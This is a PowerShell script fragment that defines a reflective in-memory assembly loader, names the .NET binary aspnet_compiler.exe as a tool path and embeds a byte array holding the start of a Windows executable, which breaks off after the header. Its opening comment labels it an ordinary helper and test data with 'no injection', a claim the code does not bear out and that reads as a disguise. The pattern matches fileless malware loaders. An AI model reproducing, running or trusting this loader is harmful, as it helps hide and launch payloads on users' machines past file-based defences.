# Ordinary reflected helper and embedded PE-format test data; no injection.
function Invoke-InMemoryAssembly {
    param(
        [byte[]]$Binary,
        [string]$TypePath,
        [string]$EntryPoint,
        [object[]]$PassedArgs
    )

    try {
        $mod = [System.Reflection.Assembly]::Load($Binary)

        $t = $mod.GetType($TypePath)
        if ($null -eq $t) {
            Write-Warning "TypePath not resolvable: $TypePath"
            return $null
        }

        $lookup = [System.Reflection.BindingFlags]::Static -bor `
                  [System.Reflection.BindingFlags]::Public -bor `
                  [System.Reflection.BindingFlags]::NonPublic

        $m = $t.GetMethod($EntryPoint, $lookup)
        if ($null -eq $m) {
            Write-Warning "EntryPoint not resolvable: $EntryPoint"
            return $null
        }

        return $m.Invoke($null, $PassedArgs)
    }
    catch {
        Write-Error ("In-memory invocation failed: {0}" -f $_.Exception.Message)
        return $null
    }
}


$toolPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe"
[byte[]]$imageData = (77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,1,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36,0,0,0,0,0,0,0,231,30,202,255,163,127,164,172,163,127,164,172,163,127,164,172,23,227,85,172,176,127,164,172,23,227,87,172,15,127,164,172,23,227,86,172,188,127,164,172,170,7,32,172,162,127,164,172,61,223,99,172,161,127,164,172,241,23,161,173,156,127,164,172,241,23,160,173,130,127,164,172,241,23,167,173,185,127,164,172,170,7,55,172,180,127,164,172,163,127,165,172,140,126,164,172,13,22,173,173,206,127,164,172,13,22,91,172,162,127,164,172,13,22,166,173,162,127,164,172,82,105,99,104,163,127,164,172)
